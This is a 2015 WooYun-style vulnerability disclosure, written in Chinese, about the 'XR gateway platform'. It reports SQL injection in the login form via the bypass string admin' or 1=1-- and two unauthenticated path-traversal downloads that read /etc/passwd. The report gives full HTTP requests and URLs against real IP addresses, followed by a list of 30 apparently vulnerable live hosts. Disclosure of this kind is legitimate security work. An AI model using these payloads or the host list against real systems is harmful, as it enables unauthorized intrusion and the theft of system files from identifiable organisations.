wybug_title: XR网关平台存在SQL注入&两处任意文件遍历下载(都无需登录)
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-05-25：	细节已通知厂商并且等待厂商处理中									2015-05-30：	厂商已经确认，细节仅向厂商公开									2015-06-02：	细节向第三方安全合作伙伴开放									2015-07-24：	细节向核心白帽子及相关领域专家公开									2015-08-03：	细节向普通白帽子公开									2015-08-13：	细节向实习白帽子公开									2015-08-28：	细节向公众公开  简要描述： rt 详细说明：  “XR网关平台”存在无需登录情况下SQL注入和两处任意文件遍历。 POST注入 （可使用万能密码 admin' or 1=1--登录）
POST /msa/main.xp HTTP/1.1Host: 112.15.171.94Connection: keep-aliveContent-Length: 47Origin: https://112.15.171.94X-Requested-With: XMLHttpRequestUser-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept: */*Referer: https://112.15.171.94/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Fun=msaAdminLogon&username=admin&password=admin
参数username存在注入。 第一处任意文件遍历： 
GET /msa/../../../../../../../../etc/passwd HTTP/1.1Host: 112.15.171.94Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*
第二处文件遍历：
https://112.15.155.122/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=test.txt+downLoadFile=../etc/passwd
   漏洞证明：  









部分30个案例：
https://112.15.155.122/https://112.15.138.234/https://112.15.171.94/https://112.15.137.254/https://112.15.171.74/https://112.15.155.150/https://112.15.132.198/https://112.15.132.194/https://112.15.147.246/https://112.15.147.234/https://112.14.162.34/https://112.15.147.222/https://112.15.137.174/https://112.15.147.230/https://112.15.128.46/https://112.15.128.58/https://112.14.168.22/https://112.15.147.254/https://112.15.138.218/https://112.15.137.234/https://112.15.138.238/https://112.15.137.230/https://112.15.137.170/https://112.16.141.6/https://112.15.128.30/https://112.14.168.14/https://112.15.137.238/https://112.15.132.178/https://112.15.138.230/https://112.15.128.74/
